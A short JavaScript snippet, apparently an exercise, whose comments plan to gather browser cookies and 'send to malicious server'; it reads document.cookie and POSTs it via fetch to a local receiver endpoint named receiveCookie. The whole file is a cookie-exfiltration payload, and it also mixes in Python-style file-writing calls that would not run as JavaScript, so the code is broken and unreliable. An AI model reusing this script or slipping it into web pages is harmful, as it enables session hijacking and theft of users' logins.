//PLAN & TODO
//  create array? map? to store cookies
//  turn object into json data
//  send to malicious server
//  server stores data into db

var cookie = document.cookie;
f = open("/home/tic/Documents/cookie.txt","a")
f.write(cookie+ ' ' + '\n')
f.close()

var jsonData = JSON.stringify(cookie);

// Send the data using fetch()
fetch("http://127.0.0.1:5000/receiveCookie", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json"
  },
  body: jsonData, 
})
.then(response => {
  if (response.status === 204) {
  } else {
  }
  })
